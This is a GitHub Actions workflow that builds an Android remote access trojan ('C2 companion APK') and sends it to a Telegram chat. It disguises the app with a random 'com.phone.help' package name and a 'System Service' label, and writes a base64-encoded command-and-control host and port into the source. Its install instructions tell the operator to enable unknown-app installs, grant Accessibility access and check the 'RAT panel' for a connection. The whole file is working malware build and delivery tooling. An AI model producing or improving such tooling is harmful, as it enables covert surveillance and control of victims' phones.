# ═══════════════════════════════════════════════════════════════
# C2 Companion APK — Build & Connection Test
#
# Purpose:
#   Build the 7-file C2 companion APK and send to Telegram
#   to test successful install + connection to RAT server.
#
# Required GitHub Secrets:
#   TELEGRAM_BOT_TOKEN  — Bot token from @BotFather
#   TELEGRAM_CHAT_ID    — Your chat/group ID
#
# Triggers:
#   - Manual (workflow_dispatch) — recommended for testing
#   - Push to main branch
# ═══════════════════════════════════════════════════════════════

name: C2 Connection Test Build

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:
    inputs:
      package_name:
        description: 'Custom package name (leave blank = random 19 chars)'
        required: false
        default: ''
      app_label:
        description: 'App label shown on device'
        required: false
        default: 'System Service'
      c2_host:
        description: 'C2 Host override (leave blank = use default in love.java)'
        required: false
        default: ''
      c2_port:
        description: 'C2 Port override (leave blank = use default in love.java)'
        required: false
        default: ''

jobs:

# ═══════════════════════════════════════════════════════════════
# JOB 1 — BUILD C2 COMPANION APK
# ═══════════════════════════════════════════════════════════════

  build:
    name: Build C2 Companion APK
    runs-on: ubuntu-latest
    timeout-minutes: 30

    steps:

      # ── Step 1: Checkout ──────────────────────────────────────
      - name: Checkout repository
        uses: actions/checkout@v4

      # ── Step 2: JDK ──────────────────────────────────────────
      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'
          cache: gradle

      # ── Step 3: Android SDK ───────────────────────────────────
      - name: Setup Android SDK
        uses: android-actions/setup-android@v3

      # ── Step 4: Generate package name ─────────────────────────
      - name: Generate package name
        id: pkg
        run: |
          INPUT_PKG="${{ github.event.inputs.package_name }}"

          if [ -n "$INPUT_PKG" ]; then
            # Use provided package name
            PKG="$INPUT_PKG"
            echo "Using provided package: $PKG"
          else
            # Generate random 19-char package: com.phone.helpXXXXX
            # Format matches original companion APK structure
            SUFFIX=$(cat /dev/urandom | tr -dc 'abcdefghijklmnopqrstuvwxyz' | head -c 5)
            PKG="com.phone.help${SUFFIX}"
            echo "Generated package: $PKG (${#PKG} chars)"
          fi

          # Validate length
          PKG_LEN=${#PKG}
          echo "Package: $PKG ($PKG_LEN chars)"

          echo "PACKAGE_NAME=$PKG" >> $GITHUB_ENV
          echo "package=$PKG" >> $GITHUB_OUTPUT

      # ── Step 5: Patch applicationId in build.gradle ───────────
      - name: Patch applicationId
        run: |
          PKG="${{ env.PACKAGE_NAME }}"
          echo "Patching applicationId → $PKG"

          # Replace applicationId in app/build.gradle
          sed -i "s|applicationId \"[^\"]*\"|applicationId \"$PKG\"|g" \
            app/build.gradle

          # Verify patch
          grep "applicationId" app/build.gradle
          echo "[OK] applicationId patched"

      # ── Step 6: Patch app label in strings.xml ────────────────
      - name: Patch app label
        run: |
          LABEL="${{ github.event.inputs.app_label }}"
          if [ -z "$LABEL" ]; then
            LABEL="System Service"
          fi

          sed -i "s|<string name=\"app_name\">[^<]*</string>|\
          <string name=\"app_name\">$LABEL</string>|g" \
            app/src/main/res/values/strings.xml

          echo "[OK] App label: $LABEL"

      # ── Step 7: Patch C2 host/port if provided ────────────────
      - name: Patch C2 host and port
        run: |
          HOST="${{ github.event.inputs.c2_host }}"
          PORT="${{ github.event.inputs.c2_port }}"

          if [ -n "$HOST" ] && [ -n "$PORT" ]; then
            echo "Patching C2: $HOST:$PORT"

            # Base64 encode new host and port to match love.java format
            HOST_B64=$(echo -n "$HOST" | base64 | tr -d '=')
            PORT_B64=$(echo -n "$PORT" | base64 | tr -d '=')

            echo "  Host B64: $HOST_B64"
            echo "  Port B64: $PORT_B64"

            # Replace in love.java
            sed -i "s|Host = \"[^\"]*\"|Host = \"$HOST_B64\"|g" \
              app/src/main/java/com/android/pictach/love.java
            sed -i "s|Port = \"[^\"]*\"|Port = \"$PORT_B64\"|g" \
              app/src/main/java/com/android/pictach/love.java

            # Verify
            grep -E "Host =|Port =" \
              app/src/main/java/com/android/pictach/love.java
            echo "[OK] C2 host/port patched"
          else
            echo "[INFO] Using default C2 from love.java"
            # Show current decoded values for verification
            python3 -c "
          import base64
          host_b64 = open('app/src/main/java/com/android/pictach/love.java').read()
          import re
          h = re.search(r'Host = \"([^\"]+)\"', host_b64)
          p = re.search(r'Port = \"([^\"]+)\"', host_b64)
          if h:
              pad = 4 - len(h.group(1)) % 4
              decoded = base64.b64decode(h.group(1) + '=' * (pad if pad != 4 else 0)).decode()
              print(f'  C2 Host: {decoded}')
          if p:
              pad = 4 - len(p.group(1)) % 4
              decoded = base64.b64decode(p.group(1) + '=' * (pad if pad != 4 else 0)).decode()
              print(f'  C2 Port: {decoded}')
            "
          fi

      # ── Step 8: Grant gradlew permission ──────────────────────
      - name: Grant gradlew execute permission
        run: chmod +x gradlew

      # ── Step 9: Build debug APK ───────────────────────────────
      - name: Build Debug APK
        id: build
        run: |
          echo "Building APK..."
          ./gradlew assembleDebug \
            --no-daemon \
            --stacktrace \
            --info \
            2>&1 | tee build_output.log

          # Check result
          if grep -q "BUILD SUCCESSFUL" build_output.log; then
            echo "BUILD_STATUS=success" >> $GITHUB_ENV
            APK_PATH=$(find app/build/outputs/apk/debug -name "*.apk" | head -1)
            echo "APK_PATH=$APK_PATH" >> $GITHUB_ENV
            APK_SIZE=$(du -h "$APK_PATH" | cut -f1)
            echo "APK_SIZE=$APK_SIZE" >> $GITHUB_ENV
            echo "[OK] Build successful — $APK_PATH ($APK_SIZE)"
          else
            echo "BUILD_STATUS=failed" >> $GITHUB_ENV
            echo "[X] Build FAILED"
          fi

      # ── Step 10: Upload APK as artifact ───────────────────────
      - name: Upload APK artifact
        if: env.BUILD_STATUS == 'success'
        uses: actions/upload-artifact@v4
        with:
          name: C2-Companion-${{ env.PACKAGE_NAME }}-${{ github.run_number }}
          path: ${{ env.APK_PATH }}
          retention-days: 7

      # ── Step 11: Send APK to Telegram ─────────────────────────
      - name: Send APK to Telegram
        if: env.BUILD_STATUS == 'success'
        run: |
          APK="${{ env.APK_PATH }}"
          PKG="${{ env.PACKAGE_NAME }}"
          SIZE="${{ env.APK_SIZE }}"
          RUN_URL="https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"
          TIMESTAMP=$(date -u '+%Y-%m-%d %H:%M UTC')

          # Decode C2 target for display
          C2_INFO=$(python3 -c "
          import base64, re
          src = open('app/src/main/java/com/android/pictach/love.java').read()
          h = re.search(r'Host = \"([^\"]+)\"', src)
          p = re.search(r'Port = \"([^\"]+)\"', src)
          host,port = 'unknown','unknown'
          if h:
              pad = 4 - len(h.group(1)) % 4
              try: host = base64.b64decode(h.group(1) + '=' * (pad if pad != 4 else 0)).decode()
              except: host = h.group(1)
          if p:
              pad = 4 - len(p.group(1)) % 4
              try: port = base64.b64decode(p.group(1) + '=' * (pad if pad != 4 else 0)).decode()
              except: port = p.group(1)
          print(f'{host}:{port}')
          " 2>/dev/null || echo "check love.java")

          curl -s -X POST \
            "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
            -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
            -F document=@"$APK" \
            -F parse_mode="Markdown" \
            -F caption="✅ *C2 Companion APK — Build #${{ github.run_number }}*

          📦 Package : \`$PKG\`
          📡 C2      : \`$C2_INFO\`
          📏 Size    : $SIZE
          📅 Built   : $TIMESTAMP

          🔗 [GitHub Actions]($RUN_URL)

          *Install steps:*
          1️⃣ Enable \`Install unknown apps\`
          2️⃣ Install this APK
          3️⃣ Open app → allow Accessibility
          4️⃣ Check RAT panel for connection"

          echo "[OK] APK sent to Telegram"

      # ── Step 12: Send success summary ─────────────────────────
      - name: Send success summary to Telegram
        if: env.BUILD_STATUS == 'success'
        run: |
          curl -s -X POST \
            "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage" \
            -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
            -d parse_mode="Markdown" \
            -d text="✅ *Build Complete — #${{ github.run_number }}*

          📦 \`${{ env.PACKAGE_NAME }}\`
          📏 ${{ env.APK_SIZE }}
          📅 $(date -u '+%Y-%m-%d %H:%M UTC')

          _APK sent above ↑_"

      # ── Step 13: Collect error log on failure ─────────────────
      - name: Collect error log on failure
        if: env.BUILD_STATUS == 'failed' || failure()
        run: |
          LOG="error_log_${{ github.run_number }}.txt"

          echo "========================================" > $LOG
          echo "C2 BUILD ERROR LOG" >> $LOG
          echo "Run     : #${{ github.run_number }}" >> $LOG
          echo "Package : ${{ env.PACKAGE_NAME }}" >> $LOG
          echo "Time    : $(date -u)" >> $LOG
          echo "========================================" >> $LOG
          echo "" >> $LOG

          if [ -f build_output.log ]; then
            echo "--- KEY ERRORS ---" >> $LOG
            grep -E "error:|Error:|FAILED|Exception|Caused by:|> Task|cannot find" \
              build_output.log | head -50 >> $LOG
            echo "" >> $LOG
            echo "--- FULL GRADLE LOG ---" >> $LOG
            cat build_output.log >> $LOG
          fi

          echo "LOG_FILE=$LOG" >> $GITHUB_ENV
          echo "[OK] Error log: $LOG ($(wc -l < $LOG) lines)"

      # ── Step 14: Upload error log artifact ────────────────────
      - name: Upload error log artifact
        if: env.BUILD_STATUS == 'failed' || failure()
        uses: actions/upload-artifact@v4
        with:
          name: error-log-${{ github.run_number }}
          path: error_log_${{ github.run_number }}.txt
          retention-days: 30

      # ── Step 15: Send error to Telegram ───────────────────────
      - name: Send error to Telegram
        if: env.BUILD_STATUS == 'failed' || failure()
        run: |
          LOG="${{ env.LOG_FILE }}"
          RUN_URL="https://github.com/${{ github.repository }}/actions/runs/${{ github.run_id }}"

          # Get key error lines for quick view
          if [ -f build_output.log ]; then
            ERRORS=$(grep -E "error:|FAILED|Exception|Caused by:|cannot find" \
              build_output.log | head -15 | head -c 2500)
          else
            ERRORS="No build log available — check GitHub Actions."
          fi

          # Send error message
          curl -s -X POST \
            "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendMessage" \
            -d chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
            -d parse_mode="Markdown" \
            -d text="❌ *Build Failed — #${{ github.run_number }}*

          📦 \`${{ env.PACKAGE_NAME }}\`
          📅 $(date -u '+%Y-%m-%d %H:%M UTC')

          \`\`\`
          ${ERRORS}
          \`\`\`

          🔗 [View full log]($RUN_URL)
          _(Download error log from Actions artifacts)_"

          # Send error log file if it exists and is under 50MB
          if [ -f "$LOG" ] && [ $(wc -c < "$LOG") -lt 50000000 ]; then
            curl -s -X POST \
              "https://api.telegram.org/bot${{ secrets.TELEGRAM_BOT_TOKEN }}/sendDocument" \
              -F chat_id="${{ secrets.TELEGRAM_CHAT_ID }}" \
              -F document=@"$LOG" \
              -F caption="📋 Full error log — Run #${{ github.run_number }}"
          fi
